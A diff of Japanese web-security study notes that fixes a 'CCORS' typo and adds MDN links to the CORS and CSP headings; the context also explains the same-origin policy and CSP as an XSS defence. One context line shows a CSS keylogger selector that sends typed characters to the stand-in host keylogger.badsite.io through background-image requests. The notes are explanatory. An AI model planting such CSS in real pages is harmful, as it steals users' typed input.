@@ -187,7 +187,7 @@ input[value$="~~"] { background-image: url("//keylogger.badsite.io/%7E%7E"); }
 ```
 keylogger.badsite.ioでアクセスを見て入力文字を知る
 
-# オリジン間リソース共有（CCORS:Cross-Origin Resource Sharing）
+# オリジン間リソース共有（[CORS:Cross-Origin Resource Sharing](https://developer.mozilla.org/ja/docs/Web/HTTP/HTTP_access_control)）
 * 同一生成元ポリシーは安全だけど窮屈なこともしばしば
     * `<img>`, `<video>`, `<audio>`などは異なるオリジンに埋め込める
     * XMLHttpRequestやFetch APIは同一生成元ポリシーに従う
@@ -219,7 +219,7 @@ Access-Control-Allow-Origin: <origin>
 ```
 というヘッダを追加する
 
-# CSP(Content Security Policy)
+# [CSP(Content Security Policy)](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP)
 
 * XSSなどの攻撃対策の一つ
 * サーバが`Content-Security-Policy`ヘッダを返すことでCSPが有効になる
